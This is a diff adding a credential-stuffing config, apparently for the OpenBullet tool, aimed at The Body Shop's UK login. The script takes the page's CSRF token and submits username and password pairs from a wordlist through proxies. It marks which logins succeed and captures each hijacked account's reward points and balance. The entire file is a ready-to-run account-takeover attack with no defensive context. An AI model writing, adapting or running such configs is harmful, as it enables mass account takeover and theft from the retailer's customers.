@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "The Body Shop",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T19:23:10.1915068+01:00",
+  "AdditionalInfo": "",
+  "Author": "Spaceman",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.thebodyshop.com/en-gb/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "CSRFToken\" value=\"" "\" />" -> VAR "csrf" 
+REQUEST POST "https://www.thebodyshop.com/en-gb/j_spring_security_check" 
+  CONTENT "j_username=<USER>&j_password=<PASS>&captchaVerificationRequired=&submit-login=&fromAcc=true&CSRFToken=<csrf>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://www.thebodyshop.com/en-gb/my-account/home" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect credentials" 
+  KEYCHAIN Success OR 
+    KEY "My Rewards<span>" 
+PARSE "<SOURCE>" LR "My Points<span>" "</span>" -> CAP "Points : " 
+PARSE "<SOURCE>" LR "My Rewards<span> " "</span>" -> CAP "Balance : " 
